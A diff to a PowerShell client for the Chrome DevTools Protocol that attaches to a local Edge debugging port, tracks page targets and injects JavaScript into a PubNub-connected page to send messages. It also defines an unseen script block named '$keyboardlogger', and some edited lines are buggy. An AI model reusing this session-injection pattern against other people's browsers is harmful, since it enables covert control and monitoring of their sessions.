@@ -180,6 +180,8 @@ class PSCDPCommand {
     [bool]$iserror = $false
     [bool]$isbroadcast = $false
 
+    [PSCDPTarget]$target = $null
+
     [bool]HasCallback() {
         return ( $null -ne $this.callback )
     }
@@ -244,13 +246,16 @@ class PSCDPTarget {
     [bool]$canAccessOpener
     [string]$browserContextId
   
+    [string]$sessionId
+
     [byte[]]$pngBytes
-    $addbinding_ok = $false
+    $addbinding_ok = $false     # set when Runtime.addBinding result arrives with success
     $console_log_check = $false    
     $executionContextId = $null # needed to execute Runtime.callFunctionOn
 
     [string] GetScreenshot() {
         # convert pngBytes to base64 string
+        return $null
     }
 }
 
@@ -454,6 +459,14 @@ function Find-PubNubBrowser {
     # should find the browser used to make pubnub connections
 }
 
+class PSCDPException : System.Exception {
+    [bool]$ispubnubnull
+
+    PSCDPException([string]$Message, $ispubnubnull) : base($Message) {
+        $this.ispubnubnull = $ispubnubnull
+    }
+}
+
 class PSCDP {
 
     $debugport = 9223
@@ -471,10 +484,15 @@ class PSCDP {
     $broadcastresponses = [System.Collections.Generic.List[object]]::new()
     $broadcasterrors = [System.Collections.Generic.List[object]]::new()
     $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
+    $callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $results = [System.Collections.Generic.List[object]]::new()
     $errors = [System.Collections.Generic.List[object]]::new() 
     $pubnubmsgs = [System.Collections.Generic.List[object]]::new()
+
+    $targets = [System.Collections.Generic.List[PSCDPTarget]]::new()
+
+    [PSCDPTarget]$pubnubTarget = $null
 
     [int32]$messageId = 1
     $receiveNew = $true
@@ -485,13 +503,6 @@ class PSCDP {
     $totalbytecount = 0
     $result = $null
 
-    $targets = [System.Collections.Generic.List[PSCDPTarget]]::new()
-
-    [PSCDPTarget]$pubnubTarget = $null
-    $addbinding_ok = $false
-    $console_log_check = $false    
-    $executionContextId = $null # needed to execute Runtime.callFunctionOn
-    
 
     [void] Reset() {
         $this.wsUri = $null
@@ -506,7 +517,9 @@ class PSCDP {
         $this.results = [System.Collections.Generic.List[object]]::new()
         $this.errors = [System.Collections.Generic.List[object]]::new() 
         $this.pubnubmsgs = [System.Collections.Generic.List[object]]::new()
-    
+        $this.callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
+        $this.targets = [System.Collections.Generic.List[PSCDPTarget]]::new()
+
         $this.messageId = 1
         $this.receiveNew = $true
         $this.byteArray = $null
@@ -515,10 +528,7 @@ class PSCDP {
         $this.memoryStream = [System.IO.MemoryStream]::new()
         $this.totalbytecount = 0
         $this.result = $null
-        $this.addbinding_ok = $false
-        $this.executionContextId = $null
-        $this.sessionId = $null
-        $this.console_log_check = $false
+        $this.pubnubTarget = $null
     }
 
     [void] CheckSocket() {
@@ -563,33 +573,34 @@ class PSCDP {
             return $this.wsUri
         }
 
-        $targets = $this.GetTargets()
+        $ttargets = $this.GetTargets()
 
-        if ( ! [string]::IsNullOrEmpty($this.initpage) ) {
-            $this.wsUri = ($targets | Where-Object { $_.url -eq $this.initpage } | Select-Object -First 1).webSocketDebuggerUrl
+        if ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) {
+            $twsUri = ($ttargets | Where-Object { $_.url -eq $this.pubnuburl } | Select-Object -First 1).webSocketDebuggerUrl
         } else {
-            $this.wsUri = ($targets | Select-Object -First 1).webSocketDebuggerUrl
+            $twsUri = ($ttargets | Select-Object -First 1).webSocketDebuggerUrl
         }
 
-        return $this.wsUri
+        return $twsUri
     }
 
-    [System.Collections.Generic.List[PSCDPTarget]] GetTargets() { # returns array of objects
-        try {
-            $ttargets = Invoke-RestMethod -Uri "http://localhost:$($this.debugport)/json" -ErrorAction Stop
-        } catch [System.Net.WebException] {
-            Log-Msg "[N3U8]: $($_.Exception.Message)"
-            return $null
-        }
-
+    [System.Collections.Generic.List[PSCDPTarget]] GetTargets() {
+        $ttargets = Invoke-RestMethod -Uri "http://localhost:$($this.debugport)/json/list" -ErrorAction Stop
 
         $stargets = [System.Collections.Generic.List[PSCDPTarget]]::new()
 
-        # $targets | Select-Object title, id, webSocketDebuggerUrl
         $stargets = $ttargets | Where-Object { $_.type -eq "page" } | ForEach-Object {
             $target = @{}
-            $_.psobject.Properties | ForEach-Object { $target[$_.Name] = $_.Value }
-    
+            $_.psobject.Properties | ForEach-Object { 
+                $key = $_.Name
+                
+                if ( $key -eq "id" ) {
+                    $key = "targetId"
+                }
+
+                $target[$key] = $_.Value 
+            }
+            
             [PSCDPTarget]$target
         }
 
@@ -616,7 +627,7 @@ class PSCDP {
         $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)
 
         if ( $null -eq $this.websocket) {
-            throw "could not connect"
+            throw "could not connect websocket"
         }
 
         $connectTask.Wait()
@@ -627,8 +638,18 @@ class PSCDP {
             autoAttach = $true
             waitForDebuggerOnStart = $false
             flatten = $true
+            filter= @(
+                @{
+                    type="page"
+                    exclude=$false
+                }
+            )
         }
         $this.sendQueue.Add( @{ method="Target.setAutoAttach"; params=$params } ) 
+    
+        $this.sendQueue.Add( @{ method="Target.setDiscoverTargets"; params=@{ discover=$true} } ) 
+
+        $this.sendQueue.Add( @{ method="Target.getTargets"} ) 
     }
 
     [PSCDPCommand] GetCommandByID([string]$id) {
@@ -698,11 +719,19 @@ class PSCDP {
             throw "Cannot send command. WebSocket is not Open (State: $($this.websocket.State))"
         }
 
+        if ( $null -eq $cmd ) {
+            throw "cmd is null"
+        }
+
         $id = $this.messageId++
 
         $cmd.id = $id
         
         $this.commands.Add($cmd)
+
+        if ( $cmd.HasCallback() ) {
+            $this.callbackcmds.Add($cmd)
+        }
 
         $payload = $cmd.ToJson() 
     
@@ -713,27 +742,15 @@ class PSCDP {
             throw "web socket is not open"
         }
     
-        try {
-            $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
-            
-            if ( $null -ne $sendTask ) {
-                $tresult = $sendTask.GetAwaiter().GetResult()
-            } else {
-                throw "fatal error -- task is null"
-            }
-        } catch {
-            Write-Error "[J7E3]: $($_.Exception.Message)"
-            return $null
-        } 
-    
-        $method = ""
-        if ( $cmd.ContainsKey('method') ) {
-            $method = $cmd['method']
+        $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
+        
+        if ( $null -ne $sendTask ) {
+            $tresult = $sendTask.GetAwaiter().GetResult()
+        } else {
+            throw "fatal error -- task is null"
         }
 
-        Log-Msg "Sent Command [$id]: $method" -ForegroundColor Cyan
-    
-        return $obj
+        return $cmd
     }
     
     [void] InitReceive() {
@@ -851,15 +868,15 @@ class PSCDP {
         $iserror = $false
         $isresult = $false
         $attachedToTarget = $false # Target.attachedToTarget
+        $targetCreated = $false
         $bindingCalled = $false
         $consoleAPICalled = $false
         $executionContextCreated = $false
         $executionContextDestroyed = $false
         $executionContextsCleared = $false
+        $sessionId = $null
 
-        try {
-            $sessionId = $msg.params.sessionId
-        } catch { }
+        try { $sessionId = $msg.params.sessionId } catch { }
 
         $msght = @{}
         $msg.psobject.Properties | ForEach-Object {
@@ -869,6 +886,8 @@ class PSCDP {
             } elseif ( $_.Name -eq "method" )  {
                 if ( $_.Value -eq 'Target.attachedToTarget' ) {
                     $attachedToTarget = $true
+                } elseif ( $_.Value -eq 'Target.targetCreated' ) {
+                    $targetCreated = $true
                 } elseif ( $_.Value -eq 'Runtime.bindingCalled' ) {
                     $bindingCalled = $true
                 } elseif ( $_.Value -eq 'Runtime.consoleAPICalled' ) {
@@ -935,7 +954,7 @@ class PSCDP {
             $origin = $msg.params.context.origin
             $executionContextId = $msg.params.context.id
 
-            $target = $this.targets | Where-Object { $_.sessionId -eq $ $sessionId } | Select-Object -First 1
+            $target = $this.targets | Where-Object { $_.sessionId -eq $sessionId } | Select-Object -First 1
 
             if ( $null -ne $target ) {
                 $target.executionContextId = $executionContextId
@@ -961,12 +980,31 @@ class PSCDP {
             throw "executionContextsCleared -- reset CDP connection"
         }
 
-        if ( $attachedToTarget ) {
+        if ( $targetCreated ) { # add target to list
+            $targetInfo = [PSCDPTarget]$msg.params.targetInfo
+            
+            $this.targets.Add($targetInfo) = $msg.params.targetInfo
+
+            if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
+                $this.pubnubTarget = $targetInfo
+                
+                $this.sendQueue.Add( @{ method="Target.attachToTarget"; params=@{ targetId=$targetInfo.targetId; flatten=$true }; } )
+            }
+
+        }
+
+        if ( $attachedToTarget ) { # update sessionId
             
             $targetInfo = [PSCDPTarget]$msg.params.targetInfo
             $targetInfo.sessionId = $sessionId
-            
-            $this.targets.Add($targetInfo) = $msg.params.targetInfo
+
+            $target = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1
+
+            if ( $null -eq $target ) {
+                $this.targets.Add($targetInfo)
+            } else {
+                $target.sessionId = $sessionId
+            }
 
             if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
                 $this.pubnubTarget = $targetInfo
@@ -983,10 +1021,17 @@ class PSCDP {
         }
 
         Log-Msg ( "sending cmd -- cmds count: " + $this.sendQueue.Count )
+        
+        $cmd = $null
 
-        $cmd = $this.sendQueue.Take()
+        try {
+            $ht = $this.sendQueue.Take()
+            $cmd = [PSCDPCommand]$ht
+        } catch {
+            Log-Msg $_
+        }
+
         $cmd = $this.SendCdpCommand($cmd)
-
     }
 
     # TODO refactor so that only commands with pending callback is being traversed
@@ -1009,7 +1054,7 @@ class PSCDP {
         $this.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true }; target=$target } )
         $this.sendQueue.Add( @{ method="Page.setLifecycleEventsEnabled"; params=@{ enabled = $true }; target=$target } )
         $this.sendQueue.Add( @{ method="DOM.enable"; params=@{ enabled = $true }; target=$target } )
-        $this.sendQueue.Add( @{ method="Runtime.enable"; params=@{ enabled = $true } }; target=$target )
+        $this.sendQueue.Add( @{ method="Runtime.enable"; params=@{ enabled = $true }; target=$target } )
         $this.sendQueue.Add( @{ method="Runtime.addBinding"; params=@{ name="onPubNubEvent" }; target=$target; callback=$script:runtime_addBinding_callback } )
 
         # $this.sendQueue.Add( @{ method="Overlay.enable"; params=@{ enabled = $true } } )
@@ -1018,7 +1063,7 @@ class PSCDP {
 
     [void] SendPBMessage([hashtable]$cmd) {
 
-        if ( [string]::IsNullOrEmpty($this.executionContextId) ) {
+        if ( [string]::IsNullOrEmpty($this.pubnubTarget.executionContextId) ) {
             throw 'executionContextId is empty'
         }
 
@@ -1028,7 +1073,7 @@ class PSCDP {
 
         $params = @{
             functionDeclaration="function f() { let tpayload=JSON.parse(atob($jsonb)); sendMessage(tpayload); }"
-            executionContextId=$this.executionContextId
+            executionContextId=$this.pubnubTarget.executionContextId
             returnByValue=$true
         }
 
@@ -1052,7 +1097,7 @@ class PSCDP {
         $target = $this.pubnubTarget
 
         if ( $null -eq $target ) {
-            throw "pubnub target null"
+            throw [PSCDPException]::new("pubnub target null", $true)
         }
 
         if ( ! $target.addbinding_ok ) {
@@ -1070,7 +1115,6 @@ class PSCDP {
         }
 
         $this.SendPBMessage($cmd)
-
     }
 
     [void] LogState() {
@@ -1094,8 +1138,8 @@ $pubnubport = $script:msedge_debugport
 $script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl)
 $script:pubnubws.ConnectCdp()
 
-$script:clientws = [PSCDP]::new($clientport)
-$script:clientws.ConnectCdp()
+#$script:clientws = [PSCDP]::new($clientport)
+#$script:clientws.ConnectCdp()
 
 $keyboardlogger = {
     try {
@@ -1138,6 +1182,10 @@ while ( $true ) {
             $i=0
         }
     
+    } catch [PSCDPException]  {
+        if ( $_.ispubnubnull ) {
+            Write-Error $($_.Exception.Message)
+        }
     } catch {
         Write-Error $($_.Exception.Message)
         Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
